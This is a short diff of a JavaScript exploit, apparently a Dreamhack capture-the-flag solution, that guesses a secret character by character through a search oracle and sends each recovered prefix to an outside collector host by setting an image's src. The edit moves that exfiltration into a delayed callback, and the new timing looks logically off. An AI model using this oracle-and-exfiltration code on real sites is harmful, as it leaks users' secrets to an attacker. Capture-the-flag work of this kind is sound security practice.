@@ -33,9 +33,7 @@
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
-                    secret += c;
-                    img.src = `https://pbqlrmu.request.dreamhack.games/${secret}`;
-                    setTimeout(() => {console.log("")}, 500); 
+                    setTimeout(() => {secret += c;img.src = `https://pbqlrmu.request.dreamhack.games/${secret}`;}, 2000); 
                     break;
                 }
             }
